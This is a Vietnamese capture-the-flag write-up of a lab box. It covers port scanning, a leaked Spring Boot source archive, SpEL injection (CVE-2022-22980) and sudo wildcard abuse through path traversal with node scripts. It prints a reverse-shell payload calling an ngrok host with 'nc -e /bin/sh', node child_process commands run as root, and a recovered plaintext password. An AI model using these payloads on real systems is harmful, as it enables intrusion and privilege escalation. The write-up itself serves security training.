Port scan:

![enter image description here](https://imgur.com/3ZwlTPf.png)

![enter image description here](https://imgur.com/O3bOYyi.png)

Truy cập vào target port 6969 bằng web browser, nhận ra port 6969 chạy HTTP.
TCP/6969 - HTTP:

![enter image description here](https://imgur.com/qPTCxvZ.png)

URL Fuzzing with Gobuster:

![enter image description here](https://imgur.com/IrUs1O0.png)

Truy cập /CHANGELOG.md:

![enter image description here](https://imgur.com/lgpDa43.png)

Page source:

![enter image description here](https://imgur.com/aBaDcSP.png)

Ở đây có 02 chỗ cần lưu ý:
1 là đoạn `change password to whitehat as default`.
2 là đoạn `you can view more <a href="/s0urc3"> here</a>` (ở page source, hidden trên view).

Truy cập /s0urc3 vừa tìm được, tự động tải về 1 file source.zip. Giải nén file source.zip ra được 1 cấu trúc thư mục và các file source có vẻ giống cấu trúc của Java Springboot.
Tóm tắt những thông tin thú vị thu được từ source:

- Ngôn ngữ: Java.
- Framework: Springboot.
- DB: MongoDB.
- Server port: 6969.
- API endpoint: POST - /v1/user/get.

File UserController.java:

![enter image description here](https://imgur.com/dQrj7iG.png)

API POST - /v1/user/get gọi đến method readUserId. Trong readUserId thực hiện truyền id (đã được URL decode) vào method findByUserNameLike của class UserRepository.

File UserRepository.java:

![enter image description here](https://imgur.com/IVMO2MB.png)

Ban đầu mình nghĩ đến NoSQL injection nhưng không khả thi. Sau một hồi tìm kiếm thì mình thấy đoạn code này có thể dính lỗ hổng SpEL (Spring Expression Language) - CVE-2022-22980. Lỗ hổng này có thể dẫn đến RCE. Lợi dụng việc đó để spawn reverse shell kết nối về local. Điểm trigger đã xác định được là API endpoint POST /v1/user/get, payload truyền vào tham số id.

Mở listener ở local. Mình sẽ dùng ngrok để thực hiện port forward từ local ra public. Vì vậy trong payload tạo reverse shell sẽ chứa địa chỉ của ngrok.
Payload:

```
T(java.lang.Runtime).getRuntime().exec("nc 0.tcp.ap.ngrok.io 13186 -e /bin/sh").waitFor()
```

URL encode payload và gửi request bằng Burp Suite:

![enter image description here](https://imgur.com/LKmGjzK.png)

Ở local nhận được kết nối reverse shell:

![enter image description here](https://imgur.com/yHy6qOl.png)

![enter image description here](https://imgur.com/h8rH0e7.png)

Well. Đã truy cập được vào target. 
User flag:

![enter image description here](https://imgur.com/PKMduwl.png)

Lướt qua một vòng target, mình nhận thấy target dùng busybox và busybox ở đây thì không hỗ trợ nhiều command lắm. 

![enter image description here](https://imgur.com/gl9Rv2y.png)

Mình cố gắng để spawn interactive shell nhưng không được (hoặc vì mình không tìm ra nhưng người khác có thể). 

Mục tiêu tiếp theo là lấy root flag. Check sudo right:

![enter image description here](https://imgur.com/DJECFD6.png)

User spring có thể chạy `sudo /user/bin/node /usr/local/scripts/*.js` với quyền root. Để làm được điều đó thì phải có mật khẩu của user spring. Hướng tiếp theo là đi tìm password của user spring. Tìm các file chứa từ khóa password trong tên:

`find / -iname *password* 2>/dev/null`

Kết quả:

![enter image description here](https://imgur.com/cgn5FUG.png)

File /opt/Passwords.kdbx có vẻ khả nghi. Phần mở rộng kdbx là file data được tạo bởi KeePass Password Safe (một phần mềm quản lý password). Lấy nó về local bằng cách encode base64 -> copy về local -> decode ở local (ở local mình đặt tên là pass.kdbx).

Mở file pass.kdbx ở local bằng keepass2. Một cửa sổ hiện lên yêu cầu nhập master password:

![enter image description here](https://imgur.com/aoarcex.png)

Nhớ lại khi truy cập vào /CHANGELOG.md ở HTTP, nội dung của trang có đề cập đến "change password to whitehat as default" (đã lưu ý ở trên). Thử nhập "whitehat" vào Master Passsword và thành công mở được file. 

![enter image description here](https://imgur.com/9nO3ldx.png)

Nội dung trong này là credentials của user spring. Lấy password bằng cách click copy password. Password của user spring là: `5DymSe0rbLE491QsCLgm`

Vì user spring không có quyền write vào /usr/local/scripts nên không thể tạo file chứa payload trong đó. Ở đây mình sẽ tạo 1 file chứa payload trong /tmp/t và lợi dụng dấu wildcard (dấu *) trong đường dẫn trên để gọi đến file chứa payload bằng lỗ hổng path traversal.

Payload liệt kê /root:

`require("child_process").exec("ls -la /root > /tmp/t/lsout.txt");`

![enter image description here](https://imgur.com/b7g2J2u.png)

Nội dung file lsout.txt chứa output của `ls -la /root`. Đọc nội dung file lsout.txt nhận thấy trong /root chỉ có 1 file là root.txt.

Payload đọc root flag: 

`process.stdout.write(require("fs").readFileSync("/root/root.txt"))` 

Tạo file /tmp/t/read.js với nội dung là payload trên. Thực thi file read.js bằng sudo để đọc được /root/root.txt:

![enter image description here](https://imgur.com/1ojKPH6.png)

Phân tích kỹ hơn về câu lệnh 
```
echo '5DymSe0rbLE491QsCLgm' | sudo -S /usr/bin/node /usr/local/scripts/../../../tmp/t/read.js
```

và 

```
echo '5DymSe0rbLE491QsCLgm' | sudo -S /usr/bin/node /usr/local/scripts/../../../tmp/t/shell.js
```

Đầu tiên, vì user spring có thể sudo /usr/bin/node /usr/local/scripts/*.js , truyền vào dấu wildcard ../../../tmp/t/read.js vẫn được tính là hợp lệ (tương tự với shell.js). Tiếp theo, vì ở đây đang là non-interactive shell nên nếu dùng sudo như bình thường thì sẽ không nhập được password khi sudo. Giải quyết vấn đề này bằng cách sử dụng echo \<password\> và pipe sang sudo -S để sudo đọc password từ stdin (thứ mà vừa pipe từ echo sang). 

Root flag ở đây là:

![enter image description here](https://imgur.com/otRy3BK.png)

P.S. Tuy đã lấy được đủ user flag và root flag nhưng mình vẫn chưa hài lòng vì chưa thành công spawn root shell. Nếu box mở thêm lâu hơn nữa thì có thể mình sẽ tìm cách để spawn root shell. Dù sao lấy được root flag cũng là cách để chứng minh đã leo thang đặc quyền thành công.

Happy Hacking!
